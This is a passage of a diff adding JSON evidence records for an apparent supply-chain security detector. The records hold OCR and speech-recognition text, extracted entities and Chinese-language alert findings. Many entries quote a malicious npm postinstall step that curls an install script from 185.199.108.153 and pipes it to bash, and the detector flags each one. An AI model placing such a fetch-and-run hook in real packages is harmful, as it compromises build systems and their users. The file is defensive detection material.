+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:54:58.730841+00:00",
+          "fingerprint": "multimodal-finding:6986cda1fdcf478b"
+        },
+        {
+          "id": "MMF-4AB6CFF15E2B9C2C",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075458712842-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:54:58.730841+00:00",
+          "fingerprint": "multimodal-finding:4ab6cff15e2b9c2c"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075454746097-D40CCA7A",
+      "filename": "MME-20260603075454746097-D40CCA7A-audio-manual-asr-alert.txt",
+      "original_filename": "manual-asr-alert.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075454746097-D40CCA7A-audio-manual-asr-alert.txt",
+      "relative_path": "storage/multimodal/MME-20260603075454746097-D40CCA7A-audio-manual-asr-alert.txt",
+      "source_type": "audio",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T07:54:54.770096+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "audio",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "audio_asr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603075454746097-D40CCA7A-audio-manual-asr-alert.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T07:54:54.751097+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-54BCF807333B81B2",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075454746097-D40CCA7A",
+          "source_type": "audio",
+          "source_name": "manual-asr-alert.txt",
+          "evidence_type": "audio_asr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:54:54.768095+00:00",
+          "fingerprint": "multimodal-finding:54bcf807333b81b2"
+        },
+        {
+          "id": "MMF-2BDEBC0EAC464795",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075454746097-D40CCA7A",
+          "source_type": "audio",
+          "source_name": "manual-asr-alert.txt",
+          "evidence_type": "audio_asr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:54:54.768095+00:00",
+          "fingerprint": "multimodal-finding:2bdebc0eac464795"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075448831178-D40CCA7A",
+      "filename": "MME-20260603075448831178-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "original_filename": "manual-ocr-screenshot.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075448831178-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "relative_path": "storage/multimodal/MME-20260603075448831178-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "source_type": "image",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T07:54:48.853673+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "visual_ocr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603075448831178-D40CCA7A-image-manual-ocr-screenshot.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T07:54:48.835283+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-693ECD0AC98601A7",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075448831178-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:54:48.851673+00:00",
+          "fingerprint": "multimodal-finding:693ecd0ac98601a7"
+        },
+        {
+          "id": "MMF-95D3A7032E858B7B",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075448831178-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:54:48.851673+00:00",
+          "fingerprint": "multimodal-finding:95d3a7032e858b7b"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075359219969-B4A4919E",
+      "filename": "MME-20260603075359219969-B4A4919E-image-incident-alert.png",
+      "original_filename": "incident-alert.png",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075359219969-B4A4919E-image-incident-alert.png",
+      "relative_path": "storage/multimodal/MME-20260603075359219969-B4A4919E-image-incident-alert.png",
+      "source_type": "image",
+      "mime_type": "image/png",
+      "size_bytes": 76773,
+      "sha256": "b4a4919ef02402228e8f13a046161e93d2cd157f7fe19840aad062f95e17ef72",
+      "uploaded_at": "2026-06-03T07:53:59.219969+00:00",
+      "metadata": {
+        "extension": ".png",
+        "content_type": "image/png",
+        "width": 1500,
+        "height": 900,
+        "opencv": {
+          "width": 1500,
+          "height": 900,
+          "channels": 3,
+          "preprocess_ready": true
+        },
+        "channels": 3,
+        "preprocess_ready": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "SupplyGuard Incident Screenshot\n高风险告警\n时间\n凌晨三点\n服务\ncheckout-api\n事件\n出现异常外联\n目标\n185.199.108.153/install.sh\n接口\nadmin/export\n访问量升高\n建议\n隔离构建产物并复核provenance",
+          "confidence": 0.994,
+          "evidence_type": "visual_ocr",
+          "engine": "PaddleOCR/PP-OCRv5",
+          "source_path": "storage/multimodal/MME-20260603075359219969-B4A4919E-image-incident-alert.png",
+          "language": "ch",
+          "created_at": "2026-06-03T07:54:07.666435+00:00",
+          "segments": [
+            {
+              "text": "SupplyGuard Incident Screenshot",
+              "confidence": 0.972
+            },
+            {
+              "text": "高风险告警",
+              "confidence": 1.0
+            },
+            {
+              "text": "时间",
+              "confidence": 1.0
+            },
+            {
+              "text": "凌晨三点",
+              "confidence": 0.998
+            },
+            {
+              "text": "服务",
+              "confidence": 1.0
+            },
+            {
+              "text": "checkout-api",
+              "confidence": 0.988
+            },
+            {
+              "text": "事件",
+              "confidence": 1.0
+            },
+            {
+              "text": "出现异常外联",
+              "confidence": 0.998
+            },
+            {
+              "text": "目标",
+              "confidence": 1.0
+            },
+            {
+              "text": "185.199.108.153/install.sh",
+              "confidence": 0.959
+            },
+            {
+              "text": "接口",
+              "confidence": 0.999
+            },
+            {
+              "text": "admin/export",
+              "confidence": 1.0
+            },
+            {
+              "text": "访问量升高",
+              "confidence": 0.999
+            },
+            {
+              "text": "建议",
+              "confidence": 1.0
+            },
+            {
+              "text": "隔离构建产物并复核provenance",
+              "confidence": 0.998
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 41,
+          "end": 45,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "SupplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/in"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 49,
+          "end": 61,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "upplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admi"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 67,
+          "end": 71,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "t Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 69,
+          "end": 71,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 75,
+          "end": 90,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "shot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核pr"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 105,
+          "end": 117,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 105,
+          "end": 117,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-7A7FC0CAE9F90847",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075359219969-B4A4919E",
+          "source_type": "image",
+          "source_name": "incident-alert.png",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 105,
+              "end": 117,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance"
+            }
+          ],
+          "evidence": "SupplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export 访问量升高 建议 隔离构建产物并复核provenance",
+          "confidence": 0.856,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:54:07.685435+00:00",
+          "fingerprint": "multimodal-finding:7a7fc0cae9f90847"
+        }
+      ],
+      "risk_score": 84,
+      "risk_level": "high"
+    },
+    {
+      "evidence_id": "MME-20260603075345873115-DDC20BBF",
+      "filename": "MME-20260603075345873115-DDC20BBF-image-cicd-error.png",
+      "original_filename": "cicd-error.png",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075345873115-DDC20BBF-image-cicd-error.png",
+      "relative_path": "storage/multimodal/MME-20260603075345873115-DDC20BBF-image-cicd-error.png",
+      "source_type": "image",
+      "mime_type": "image/png",
+      "size_bytes": 86781,
+      "sha256": "ddc20bbf75475502c7210cb486ea2c86391daf10f72a0108c1837b9a467debfe",
+      "uploaded_at": "2026-06-03T07:53:45.873115+00:00",
+      "metadata": {
+        "extension": ".png",
+        "content_type": "image/png",
+        "width": 1600,
+        "height": 950,
+        "opencv": {
+          "width": 1600,
+          "height": 950,
+          "channels": 3,
+          "preprocess_ready": true
+        },
+        "channels": 3,
+        "preprocess_ready": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "GitHub Actions / deploy-prod-2481\n[09:42:10]\nRun npm ci\nnpm\ninstall\n@acme/payments-helper@9.9.2\nresolved\n@acme/payments-helper\nr from public registry\n@acme/payments-helper@9.9.2 p\npostinstall\npostinstall\ncurl\n185.199.108.\n.153/install.sh\nbash\nwarning:\nunexpected\nexternal\ndownload\nduring\nbuild\nartifact\ndigest\nmismatch:\nsha256:87e3dd15\ndeploy\nblocked:\nprovenance\nrequires\nmanual\nreview\nExpected\nOCR:\nnpm\ninstall\n+ postinstall\nlcurl\n185.199.108.153/install.sh",
+          "confidence": 0.994,
+          "evidence_type": "visual_ocr",
+          "engine": "PaddleOCR/PP-OCRv5",
+          "source_path": "storage/multimodal/MME-20260603075345873115-DDC20BBF-image-cicd-error.png",
+          "language": "ch",
+          "created_at": "2026-06-03T07:53:59.196969+00:00",
+          "segments": [
+            {
+              "text": "GitHub Actions / deploy-prod-2481",
+              "confidence": 0.981
+            },
+            {
+              "text": "[09:42:10]",
+              "confidence": 0.992
+            },
+            {
+              "text": "Run npm ci",
+              "confidence": 0.996
+            },
+            {
+              "text": "npm",
+              "confidence": 0.976
+            },
+            {
+              "text": "install",
+              "confidence": 1.0
+            },
+            {
+              "text": "@acme/payments-helper@9.9.2",
+              "confidence": 1.0
+            },
+            {
+              "text": "resolved",
+              "confidence": 1.0
+            },
+            {
+              "text": "@acme/payments-helper",
+              "confidence": 0.998
+            },
+            {
+              "text": "r from public registry",
+              "confidence": 0.973
+            },
+            {
+              "text": "@acme/payments-helper@9.9.2 p",
+              "confidence": 0.99
+            },
+            {
+              "text": "postinstall",
+              "confidence": 1.0
+            },
+            {
+              "text": "postinstall",
+              "confidence": 1.0
+            },
+            {
+              "text": "curl",
+              "confidence": 0.996
+            },
+            {
+              "text": "185.199.108.",
+              "confidence": 0.999
+            },
+            {
+              "text": ".153/install.sh",
+              "confidence": 0.999
+            },
+            {
+              "text": "bash",
+              "confidence": 0.999
+            },
+            {
+              "text": "warning:",
+              "confidence": 0.999
+            },
+            {
+              "text": "unexpected",
+              "confidence": 0.999
+            },
+            {
+              "text": "external",
+              "confidence": 0.999
+            },
+            {
+              "text": "download",
+              "confidence": 1.0
+            },
+            {
+              "text": "during",
+              "confidence": 0.999
+            },
+            {
+              "text": "build",
+              "confidence": 1.0
+            },
+            {
+              "text": "artifact",
+              "confidence": 1.0
+            },
+            {
+              "text": "digest",
+              "confidence": 1.0
+            },
+            {
+              "text": "mismatch:",
+              "confidence": 0.997
+            },
+            {
+              "text": "sha256:87e3dd15",
+              "confidence": 1.0
+            },
+            {
+              "text": "deploy",
+              "confidence": 1.0
+            },
+            {
+              "text": "blocked:",
+              "confidence": 0.999
+            },
+            {
+              "text": "provenance",
+              "confidence": 0.999
+            },
+            {
+              "text": "requires",
+              "confidence": 1.0
+            },
+            {
+              "text": "manual",
+              "confidence": 0.999
+            },
+            {
+              "text": "review",
+              "confidence": 1.0
+            },
+            {
+              "text": "Expected",
+              "confidence": 1.0
+            },
+            {
+              "text": "OCR:",
+              "confidence": 0.993
+            },
+            {
+              "text": "npm",
+              "confidence": 0.998
+            },
+            {
+              "text": "install",
+              "confidence": 0.999
+            },
+            {
+              "text": "+ postinstall",
+              "confidence": 0.999
+            },
+            {
+              "text": "lcurl",
+              "confidence": 0.918
+            },
+            {
+              "text": "185.199.108.153/install.sh",
+              "confidence": 0.983
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "time",
+          "value": "09:42:10",
+          "normalized": "09:42:10",
+          "start": 35,
+          "end": 43,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9"
+        },
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 68,
+          "end": 95,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "loy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public re"
+        },
+        {
+          "type": "package",
+          "value": "@acme/payments-helper",
+          "normalized": "@acme/payments-helper",
+          "start": 105,
+          "end": 126,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "pm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9."
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 180,
+          "end": 191,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "m public registry @acme/payments-helper@9.9.2 p postinstall postinstall curl 185.199.108. .153/install.sh b"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 204,
+          "end": 208,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "payments-helper@9.9.2 p postinstall postinstall curl 185.199.108. .153/install.sh bash warning: unex"
+        },
+        {
+          "type": "action",
+          "value": "bash",
+          "normalized": "bash",
+          "start": 238,
+          "end": 242,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "l postinstall curl 185.199.108. .153/install.sh bash warning: unexpected external download during bu"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 432,
+          "end": 447,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "w Expected OCR: npm install + postinstall lcurl 185.199.108.153/install.sh"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-B2364D83444672DB",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075345873115-DDC20BBF",
+          "source_type": "image",
+          "source_name": "cicd-error.png",
+          "evidence_type": "visual_ocr",
